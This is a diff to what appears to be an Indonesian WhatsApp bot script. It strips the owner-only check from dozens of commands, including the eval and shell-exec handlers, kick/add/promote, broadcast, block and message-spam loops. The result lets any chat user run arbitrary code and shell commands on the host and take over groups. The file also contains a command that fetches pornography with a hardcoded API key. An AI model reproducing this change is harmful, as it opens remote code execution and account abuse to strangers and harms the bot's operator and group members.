@@ -1966,7 +1966,7 @@ for (let i = 0; i < jumlah; i++) {
 //=================================================//
 case 'soulbi': case 'soul8': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
+
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hai saya soul`
@@ -1978,7 +1978,7 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'soulca': case 'soul9': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1991,7 +1991,7 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'soulci': case 'soul10': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -2004,7 +2004,7 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'soulcu': case 'soul11': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -2017,7 +2017,7 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'soulco': case 'sleme12': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -2030,7 +2030,7 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'ban': case 'banned': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!args[0]) return m.reply(`*Enter Option Select add or delete*`)
 if (args[1]) {
@@ -2720,7 +2720,7 @@ haikal.sendMessage(from, reactionMessage)
 break
 //=================================================//
 case 'join': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!text) throw 'Masukkan Link Group!'
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
@@ -2730,7 +2730,7 @@ await haikal.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).c
 break
 //=================================================//
 case 'keluar': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 await haikal.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
 }
@@ -2746,7 +2746,7 @@ reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Au
 break
 //=================================================//
 case 'kick': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw groupon(from)
 if (!isBotAdmins) throw SiGroupadmin(from)
@@ -2757,7 +2757,7 @@ await haikal.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.
 break
 //=================================================//
 case 'add': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw groupon(from)
 if (!isBotAdmins) throw SiGroupadmin(from)
@@ -2768,7 +2768,7 @@ await haikal.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.rep
 break
 //=================================================//
 case 'promote': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw groupon(from)
 if (!isBotAdmins) throw SiGroupadmin(from)
@@ -2779,7 +2779,7 @@ await haikal.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m
 break
 //=================================================//
 case 'demote': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw groupon(from)
 if (!isBotAdmins) throw SiGroupadmin(from)
@@ -2790,7 +2790,7 @@ await haikal.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.
 break
 //=================================================//
 case 'block': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await haikal.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
@@ -2798,7 +2798,7 @@ await haikal.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(
 break
 //=================================================//
 case 'unblock': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await haikal.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
@@ -2925,7 +2925,7 @@ haikal.sendMessage(m.chat, wbuttsss,{ quoted: m }).catch(err => {
 break
 //=================================================//
 case 'setppbot': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 sticWait(from)
 if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
@@ -3206,7 +3206,7 @@ break
  }
  break*/
 case 'spam': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!m.quoted) return m.reply("Reply pesanya!")
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -3849,7 +3849,7 @@ await haikal.sendMessage(m.chat, { audio: xeony_buffer, mimetype: 'audio/mp4', p
 break*/
 //=================================================//
 /*case 'bcgc': case 'bcgroup': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
 let getGroups = await haikal.groupFetchAllParticipating()
@@ -3892,7 +3892,7 @@ reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
 break
 //=================================================//
 case 'bc': case 'broadcast': case 'bcall': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
 let anu = await store.chats.all().map(v => v.id)
@@ -4161,7 +4161,7 @@ reply(e)
 break
 //=================================================//
 case 'setcmd': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!m.quoted) throw 'Reply Pesan!'
 if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
@@ -4180,7 +4180,7 @@ reply(`Done!`)
 break
 //=================================================//
 case 'delcmd': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 let hash = m.quoted.fileSha256.toString('base64')
 if (!hash) throw `Tidak ada hash`
@@ -4191,7 +4191,7 @@ reply(`Done!`)
 break
 //=================================================//
 case 'listcmd': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 let teks = `
 *List Hash*
@@ -4203,7 +4203,7 @@ haikal.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticke
 break
 //=================================================//
 case 'lockcmd': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!m.quoted) throw 'Reply Pesan!'
 if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
@@ -4215,7 +4215,7 @@ reply('Done!')
 break
 //=================================================//
 case 'public': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 haikal.public = true
 reply('Sukse Change To Public')
@@ -4223,7 +4223,7 @@ reply('Sukse Change To Public')
 break
 //=================================================//
 case 'self': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 haikal.public = false
 reply('Sukses Change To Self')
@@ -4368,7 +4368,7 @@ m.reply(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :
 break
 //=================================================//
 case 'bokep':{
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
 haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: m })
@@ -4376,7 +4376,7 @@ haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${co
 break
 //=================================================//
 case 'penjara':
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`*Contoh* :\n#penjara namagroup`)
 let cret = await haikal.groupCreate(args.join(" "), [])
@@ -4391,7 +4391,7 @@ reply(teks)
 break
 //=================================================//
 case 'antilink': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 
 if (!m.isGroup) return groupon(from)
@@ -4412,7 +4412,7 @@ m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
 }
 break
 case 'soulghoib': case 'welcome': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 
 if (!m.isGroup) return groupon(from)
@@ -4500,7 +4500,7 @@ m.reply('Pilih on atau off')
 break
 //=================================================//
 case 'cowner': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!args[0]) return m.reply(`*Example* : #cowner add 628xxxx`)
 if (args[1]) {
@@ -4999,7 +4999,7 @@ thumbnailUrl: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRtWFvReVAr
 break
 //=================================================//
 case 'bot': {
-if (!isCreator) return
+
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productMessage": {
@@ -5607,7 +5607,7 @@ break*/
 //=================================================//
 default:
 if (budy.startsWith('=>')) {
-if (!isCreator) return
+
 function Return(sul) {
 sat = JSON.stringify(sul, null, 2)
 bang = util.format(sat)
@@ -5619,7 +5619,7 @@ m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
 } catch (e) {
 m.reply(String(e))}}
 if (budy.startsWith('>')) {
-if (!isCreator) return sticOwner(from)
+ sticOwner(from)
 try {
 let evaled = await eval(budy.slice(2))
 if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
@@ -5627,7 +5627,7 @@ await m.reply(evaled)
 } catch (err) {
 await m.reply(String(err))}}
 if (budy.startsWith('$')) {
-if (!isCreator) return 
+ 
 exec(budy.slice(2), (err, stdout) => {
 if(err) return m.reply(err)
 if (stdout) return m.reply(stdout)})}
